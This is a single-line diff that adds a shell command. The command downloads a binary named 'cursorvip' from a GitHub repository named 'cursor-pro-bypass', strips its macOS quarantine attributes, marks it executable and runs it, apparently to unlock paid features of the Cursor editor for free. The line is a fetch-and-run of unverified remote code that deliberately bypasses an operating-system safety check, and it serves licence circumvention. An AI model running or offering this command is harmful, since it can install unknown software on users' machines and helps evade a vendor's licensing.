@@ -1,0 +1,1 @@
+cd $TMPDIR && curl -O https://raw.githubusercontent.com/cursor-pro-bypass/cursor-pro-free/main/cursorvip && xattr -c cursorvip  && chmod +x cursorvip  && ./cursorvip
